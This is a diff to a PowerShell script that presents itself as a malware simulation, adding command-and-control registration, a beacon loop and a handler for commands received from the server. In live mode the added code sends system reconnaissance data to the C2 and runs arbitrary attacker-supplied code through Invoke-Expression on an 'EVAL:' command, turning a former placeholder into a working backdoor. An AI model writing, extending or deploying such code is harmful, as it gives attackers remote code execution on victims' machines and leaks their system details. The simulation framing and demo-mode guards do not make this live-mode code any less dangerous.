@@ -466,6 +466,104 @@ function Show-ProcessHollowing {
     }
 }
 
+# ===========================================================================
+# C2 REGISTRATION & REMOTE COMMAND HANDLING
+# ===========================================================================
+
+$Global:Registered = $false
+
+function Register-WithC2 {
+    Write-Host "[*] Performing one-time registration with C2..." -ForegroundColor Cyan
+    $regData = Get-SystemRecon
+    # Attempt registration (will return whatever the C2 responds with)
+    $response = Send-Beacon -Data $regData -Endpoint "/register"
+    if ($null -ne $response) {
+        $Global:Registered = $true
+        Write-Host "    [OK] Registration acknowledged by C2." -ForegroundColor Green
+    }
+    else {
+        Write-Host "    [!] No response from C2 during registration." -ForegroundColor Yellow
+    }
+    return $response
+}
+
+function Execute-C2Command {
+    param([string]$Command)
+
+    if (-not $Command) { return }
+
+    Write-Host "    [C2] Command received: $Command" -ForegroundColor Magenta
+
+    # Known commands implemented for demo visibility
+    # - RECON: run Get-SystemRecon and POST results to /heartbeat
+    # - MEMEXEC: run Invoke-MemoryExecution and POST results
+    # - RUN_RECON_INVOKE: run Invoke-Expression to execute Get-SystemRecon | ConvertTo-Json
+    # - EVAL:<code>: (LiveMode only) execute arbitrary code via Invoke-Expression and POST output
+
+    $cmdUp = $Command.ToUpper()
+    if ($cmdUp -eq 'RECON') {
+        if ($Global:DemoMode) { Write-Host "    [DEMO] Would run recon and send results." -ForegroundColor Gray; return }
+        $recon = Get-SystemRecon
+        $payload = @{
+            SessionId = $Global:UniqueId
+            Command = $Command
+            Recon = $recon
+            Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+        }
+        Send-Beacon -Data $payload -Endpoint "/heartbeat"
+    }
+    elseif ($cmdUp -eq 'MEMEXEC') {
+        if ($Global:DemoMode) { Write-Host "    [DEMO] Would run Invoke-MemoryExecution and send results." -ForegroundColor Gray; return }
+        $res = Invoke-MemoryExecution
+        $payload = @{
+            SessionId = $Global:UniqueId
+            Command = $Command
+            Result = $res
+            Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+        }
+        Send-Beacon -Data $payload -Endpoint "/heartbeat"
+    }
+    elseif ($cmdUp -eq 'RUN_RECON_INVOKE') {
+        $psCmd = 'Get-SystemRecon | ConvertTo-Json -Compress'
+        if ($Global:DemoMode) { Write-Host "    [DEMO] Would Invoke-Expression: $psCmd" -ForegroundColor Gray; return }
+        try {
+            $json = Invoke-Expression $psCmd
+            $payload = @{
+                SessionId = $Global:UniqueId
+                Command = $Command
+                ReconJson = $json
+                Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+            }
+            Send-Beacon -Data $payload -Endpoint "/heartbeat"
+        }
+        catch {
+            Write-Error "    [!] Failed running invoked recon: $($_.Exception.Message)"
+        }
+    }
+    elseif ($cmdUp.StartsWith('EVAL:')) {
+        $code = $Command.Substring(5)
+        if ($Global:DemoMode) { Write-Host "    [DEMO] EVAL blocked in DemoMode. Code: $code" -ForegroundColor Gray; return }
+        try {
+            $output = Invoke-Expression $code
+            $jsonOut = $null
+            try { $jsonOut = $output | ConvertTo-Json -Compress -ErrorAction SilentlyContinue } catch { $jsonOut = $output.ToString() }
+            $payload = @{
+                SessionId = $Global:UniqueId
+                Command = $Command
+                Output = $jsonOut
+                Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+            }
+            Send-Beacon -Data $payload -Endpoint "/heartbeat"
+        }
+        catch {
+            Write-Error "    [!] EVAL failed: $($_.Exception.Message)"
+        }
+    }
+    else {
+        Write-Host "    [!] Unrecognized command: $Command" -ForegroundColor Yellow
+    }
+}
+
 # ==========================================================================
 # BEACON LOOP
 # ==========================================================================
@@ -477,6 +575,11 @@ function Start-BeaconLoop {
     Write-Host ""
     
     $iteration = 0
+    # Ensure we've registered once before sending heartbeats
+    if (-not $Global:Registered) {
+        Register-WithC2
+    }
+
     while ($true) {
         $iteration++
         Write-Host "[Beacon $iteration] $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor DarkCyan
@@ -488,11 +591,12 @@ function Start-BeaconLoop {
             Status = "Active"
         }
         
-        $response = Send-Beacon -Data $beaconData -Endpoint "/register"
-        
+        # Use heartbeat endpoint after initial registration
+        $response = Send-Beacon -Data $beaconData -Endpoint "/heartbeat"
+
         if ($response -and $response.command) {
             Write-Host "    [!] Received command from C2: $($response.command)" -ForegroundColor Magenta
-            # In real malware, commands would be executed here
+            Execute-C2Command -Command $response.command
         }
         
         Start-Sleep -Seconds $Interval
@@ -522,14 +626,19 @@ function Start-Simulation {
     Show-WMIEventSub
     Show-ProcessHollowing
     
-    # Start Beaconing (only runs in Live Mode)
-    if (-not $Global:DemoMode) {
-        Write-Host ""
+    # Start Beaconing (run in both Demo and Live so C2 registration and commands can be exercised)
+    Write-Host ""
+    if ($Global:DemoMode) {
+        Write-Host "==========================================================" -ForegroundColor DarkGray
+        Write-Host "  STARTING BEACON LOOP (DEMO MODE: commands logged only)  " -ForegroundColor Yellow
+        Write-Host "==========================================================" -ForegroundColor DarkGray
+    }
+    else {
         Write-Host "==========================================================" -ForegroundColor DarkGray
         Write-Host "       STARTING BEACON LOOP (Press Ctrl+C to stop)        " -ForegroundColor Green
         Write-Host "==========================================================" -ForegroundColor DarkGray
-        Start-BeaconLoop -Interval 10
     }
+    Start-BeaconLoop -Interval 10
     
     Write-Host ""
     Write-Host "--- Simulation Complete ---" -ForegroundColor DarkGray
